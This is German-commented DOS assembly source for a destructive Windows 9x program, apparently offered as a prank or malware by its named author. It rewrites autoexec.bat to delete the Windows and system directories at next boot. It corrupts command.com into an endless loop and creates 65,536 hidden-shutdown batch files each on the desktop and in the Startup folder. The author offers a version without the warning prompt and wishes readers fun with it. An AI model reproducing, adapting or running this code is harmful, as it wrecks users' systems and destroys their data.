;Beschreibung:

;Vorausgesetzt ist, dass sich Win9x in C:\WINDOWS\ befindet.

;Zuerst gibt dieses Programm folgende Meldung aus:

; Dieses Programm ist nur für Test- und Studienzwecke zu benutzen!
; Bei Schäden jeglicher Art übernehme ich keine Haftung!
; Der Autor: Rafael Friesen
; Soll dieses Programm nun ausgeführt werden, dann bitte jetzt Enter drücken!

;nachdem dann Enter gedrückt wurde, verändert das Programm:
;- c:\autoexec.bat, in dieser Datei steht dann:

; del c:\windows\*.*
; del C:\windows\system\*.*

;dann wird c:\command.com zu einer Endlosschleife verändert.

;nun werden in C:\WINDOWS\DESKTOP\ und C:\WINDOWS\STARTM~1\PROGRA~1\AUTOST~1\ 
;nett0000.bat bis nettFFFF.bat erstellt (jeweils 65536 Dateien)

;in jeder Datei steht: 

; echo off
; cls
; C:\WINDOWS\rundll32.exe USER,EXITWINDOWS

;Die ersten beiden Befehle machen den folgenden Befehl für den Benutzer unsichtbar,
;der 3. Befehl ist die Windowsanweisung, Windows zu beenden.

;das Ausführbare Programm gibts bei RafaelFriesen@arcor.de (auch ohne die Meldung am Anfang)
;viel Spass damit wünscht Rafael Friesen

.model tiny
.code
;Meld ausgeben
mov dx,offset Meld
mov ax,0900h
int 21h
mov ax,0700h
int 21h
cmp al,13
je losgehts
mov ax,4c00h
int 21h
losgehts:

;autoexec.bat verändern
mov ax,03c00
xor cx,cx
mov dx,offset datbat
int 021
;datei schreiben
mov bx,ax
mov ax,04000
mov cx,45
mov dx,offset txtbat
int 021
;datei schliessen
mov ax,03e00
int 021

;command.com verändern
mov ax,03c00
xor cx,cx
mov dx,offset datcom
int 021
;datei schreiben
mov bx,ax
mov ax,04000
mov cx,2
mov dx,offset txtcom
int 021
;datei schliessen
mov ax,03e00
int 021

;viele dateien erzeugen
xor cx,cx
mov [offset zlr],cx
los:
mov bx,offset tab
mov al,ch
and al,0f0
shr al,4
xlat
mov [offset dat1+23],al
mov [offset dat2+42],al
mov al,ch
and al,0f
xlat
mov [offset dat1+24],al
mov [offset dat2+43],al
mov al,cl
and al,0f0
shr al,4
xlat
mov [offset dat1+25],al
mov [offset dat2+44],al
mov al,cl
and al,0f
xlat
mov [offset dat1+26],al
mov [offset dat2+45],al
;datei1 öffnen
mov ax,03c00
xor cx,cx
mov dx,offset dat1
int 021
;datei1 schreiben
mov bx,ax
mov ax,04000
mov cx,55
mov dx,offset txt
int 021
;datei1 schliessen
mov ax,03e00
int 021
;datei2 öffnen
mov ax,03c00
xor cx,cx
mov dx,offset dat2
int 021
;datei2 schreiben
mov bx,ax
mov ax,04000
mov cx,55
mov dx,offset txt
int 021
;datei2 schliessen
mov ax,03e00
int 021
mov cx,[offset zlr]
inc cx
mov [offset zlr],cx
cmp cx,0ffff
jne los
;ende
mov ax,4c00h
int 21h

.data
Meld:	db "Dieses Programm ist nur für Test- und Studienzwecke zu benutzen!",0d,0a
	db "Bei Schäden jeglicher Art übernehme ich keine Haftung!",0d,0a
	db "Der Autor: Rafael Friesen",0d,0a
	db "Soll dieses Programm nun ausgeführt werden, dann jetzt bitte Enter drücken!",0d,0a,"$"
tab:	db "0123456789ABCDEF"
datbat:	db "C:\autoexec.bat",0
datcom:	db "C:\command.com",0
dat1:	db "C:\WINDOWS\DESKTOP\nett0000.bat",0
dat2:	db "C:\WINDOWS\STARTM~1\PROGRA~1\AUTOST~1\nett0000.bat",0
txt:	db "echo off",13,10,"cls",13,10,"C:\WINDOWS\rundll32.exe USER,EXITWINDOWS"
txtbat:	db "del c:\windows\*.*",0d,0a,"del C:\windows\system\*.*"
txtcom:	db 0eb,0fe
zlr:	dw 0
Hallo:	db "Herzliche grüsse an alle, die mich kennen."

end